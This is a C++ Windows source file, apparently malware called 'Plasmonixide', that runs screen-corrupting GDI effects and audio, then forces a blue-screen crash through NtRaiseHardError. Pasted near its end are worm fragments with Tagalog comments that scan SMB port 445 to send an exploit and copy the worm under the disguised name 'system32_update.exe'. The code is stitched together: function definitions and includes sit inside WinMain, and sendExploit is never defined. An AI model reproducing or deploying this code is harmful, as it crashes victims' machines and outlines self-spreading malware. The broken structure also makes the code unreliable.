﻿// Plasmonixide.cpp - Full 10 Payload Sequence
#include <windows.h>
#include <winternl.h>
#include <shellapi.h>
#include <cmath>
#include <thread>
#include <vector>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdi32.lib")

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
extern "C" NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

int w = GetSystemMetrics(0), h = GetSystemMetrics(1);

// --- BYTEBEAT AUDIO ENGINE ---
void BytebeatThread() {
    for (int t = 0; ; t++) {
        // High-intensity glitch formula
        int s = (t * (t >> 5 | t >> 8) >> 2 | t >> 4) ^ (t & t >> 12);
        Beep((s % 1200) + 150, 8);
    }
}

void TriggerBSOD() {
    BOOLEAN b;
    ULONG response;
    RtlAdjustPrivilege(19, TRUE, FALSE, &b);
    // CRITICAL_PROCESS_DIED Hard Error
    NtRaiseHardError(0xC000021A, 0, 0, NULL, 6, &response);
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    // Initial Warnings
    if (MessageBoxA(NULL, "Execute Plasmonixide.exe? This will lead to a system crash.", "Plasmonixide", MB_ICONWARNING | MB_YESNO) == IDNO) return 0;

    std::thread(BytebeatThread).detach();
    HDC hdc = GetDC(0);
    HBRUSH brush;

    // PAYLOAD 1: Blue lines + Color Shift
    for (int t = 0; t < 300; t++) {
        HPEN hPen = CreatePen(PS_SOLID, 2, RGB(0, 100, 255));
        SelectObject(hdc, hPen);
        MoveToEx(hdc, w, 0, NULL);
        LineTo(hdc, rand() % w, rand() % h);
        DeleteObject(hPen);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, DSTINVERT);
        Sleep(40);
    }

    // PAYLOAD 2: Background cycling
    for (int t = 0; t < 50; t++) {
        brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        FillRect(hdc, new RECT{0, 0, w, h}, brush);
        DeleteObject(brush);
        Sleep(100);
    }

    // PAYLOAD 3: X^Y Pattern + Bouncing Circle
    for (int t = 0; t < 150; t++) {
        int cx = w / 2 + cos(t * 0.1) * 200, cy = h / 2 + sin(t * 0.1) * 200;
        for (int x = 0; x < w; x += 40) {
            for (int y = 0; y < h; y += 40) {
                if ((x ^ y) % (t + 1) == 0) SetPixel(hdc, x, y, RGB(x % 255, y % 255, t % 255));
            }
        }
        Ellipse(hdc, cx - 50, cy - 50, cx + 50, cy + 50);
    }

    // PAYLOAD 4: BitBlt SRCINVERT
    for (int t = 0; t < 80; t++) {
        BitBlt(hdc, rand() % 20, rand() % 20, w, h, hdc, rand() % 20, rand() % 20, SRCINVERT);
        Sleep(50);
    }

    // PAYLOAD 5: Sinewave & PolyBezier (From 0,0)
    for (int t = 0; t < 80; t++) {
        POINT pts[4] = {{0, 0}, {rand() % w, rand() % h}, {rand() % w, rand() % h}, {w, h}};
        PolyBezier(hdc, pts, 4);
        BitBlt(hdc, sin(t) * 20, 0, w, h, hdc, 0, 0, SRCCOPY);
        Sleep(50);
    }

    // PAYLOAD 6 & 7: Train Glitch & Buggy Shader
    for (int i = 0; i < 80; i++) {
        BitBlt(hdc, i % 50, i % 50, w, h, hdc, 0, 0, SRCCOPY);
        brush = CreateHatchBrush(HS_DIAGCROSS, RGB(rand() % 255, 0, rand() % 255));
        SelectObject(hdc, brush);
        PatBlt(hdc, 0, 0, w, h, PATINVERT);
        DeleteObject(brush);
    }

    // PAYLOAD 8: Sierpinski Triangle & Red Distortion
    for (int i = 0; i < 4000; i++) {
        static int px = w / 2, py = h / 2;
        int target = rand() % 3;
        if (target == 0) { px = (px + w / 2) / 2; py = (py + 50) / 2; }
        else if (target == 1) { px = (px + 50) / 2; py = (py + h - 50) / 2; }
        else { px = (px + w - 50) / 2; py = (py + h - 50) / 2; }
        SetPixel(hdc, px, py, RGB(255, 0, 0));
    }

    // PAYLOAD 9: Movement
    for (int i = 0; i < 30; i++) {
        BitBlt(hdc, rand() % 10 - 5, rand() % 10 - 5, w, h, hdc, 0, 0, SRCCOPY);
        Sleep(50);
    }

// Konsepto ng pag-scan sa isang IP address
#include <winsock2.h> // Para sa Windows networking

void scanNetwork(const char* targetIP) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(445); // Port para sa File Sharing (SMB)
    target.sin_addr.s_addr = inet_addr(targetIP);

    // Susubukan kung "open" ang pinto ng biktima
    if (connect(sock, (struct sockaddr*)&target, sizeof(target)) == 0) {
        // Kapag nag-connect, dito na magpapadala ng "Exploit"
        sendExploit(sock); 
    }
    closesocket(sock);
}
#include <filesystem>
namespace fs = std::filesystem;

void replicateSelf(std::string targetPath) {
    try {
        // Kukunin ang location ng worm ngayon
        fs::path currentWorm = fs::current_path() / "worm.exe";
        // Ikokopya ang sarili sa bagong computer (targetPath)
        fs::copy(currentWorm, targetPath + "\\system32_update.exe");
    } catch (...) {
        // Error handling kung hindi makopya
    }
}
 
    // PAYLOAD 10: BSOD
    TriggerBSOD();
    return 0;
}
